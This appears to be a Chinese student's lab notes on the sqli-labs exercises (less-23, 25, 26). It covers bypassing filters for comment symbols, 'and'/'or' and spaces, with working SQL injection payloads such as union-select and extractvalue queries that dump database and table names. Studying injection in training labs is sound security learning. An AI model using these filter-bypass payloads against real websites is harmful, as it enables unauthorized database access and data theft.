### 注释符号绕过



![Screenshot_20260125_152421_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260125_152421_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)



###### 常见注释符号： --   #    %23



以 less-23 为例子

![image-20260125152856727](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125152856727.png)

我们可以看到是单引号闭合，引发了报错，后门我们试着用 --+ 试着注释掉它

![image-20260125153000603](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125153000603.png)

发现依然没有帮助，没有把后面的内容注释掉，报错仍然存在



我们看源代码：

![Screenshot_20260125_153307_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260125_153307_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

发现我们的注释符全部都被替换为空了，所以我们要想办法绕过。



![Screenshot_20260125_153947_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260125_153947_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)



方法如下图所示

![image-20260125155233054](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125155233054.png)

?id=-1' union select 1,(select database()),3'    我们在末尾加上一个 ‘ ，使其与源代码中后面的 ’ 闭合形成 ‘’ ，其中 ‘’ 为空并且成对，不影响命令的写入和执行

或者 ?id=-1' union select 1,(select database()),3 and(or) '1'='3    本质上意义相同







### and 和 or 过滤绕过

![67af04d2c995494ccb3d13420effa926](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\67af04d2c995494ccb3d13420effa926.jpg)

![b26dc174333b5551f1e2f68b1972bd79](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\b26dc174333b5551f1e2f68b1972bd79.jpg)

注：&&时要用URL编码

以 less-25 为例

![image-20260125160316798](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125160316798.png)

发现 and 被删除了

![image-20260125160410012](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125160410012.png)

双写绕过就可以了







### 空格过滤

![e9fbc8cccfb8649426616b80b7b23ddc](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\e9fbc8cccfb8649426616b80b7b23ddc.jpg)

以 less-26 为例

![image-20260125162915147](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125162915147.png)

可以看到空格消失了

我们试着使用URL编码绕过

![image-20260125164113788](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125164113788.png)

发现行不通，因为环境不一样，在Windows下不行，但在linux环境下好像可以



所以我们试着使用报错注入：

![Screenshot_20260125_165100_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260125_165100_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

把黄色括号内的内容替换成下列语句就可以查询到不同内容，核心思想就是用括号代替空格和and或者or



?id=0'||extractvalue(1,concat('$',(database())))||'1'='1

![image-20260125164539958](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125164539958.png)

?id=0'||extractvalue(1,concat('$',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))||'1'='1

![image-20260125165020825](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260125165020825.png)



![Screenshot_20260125_165410_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260125_165410_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)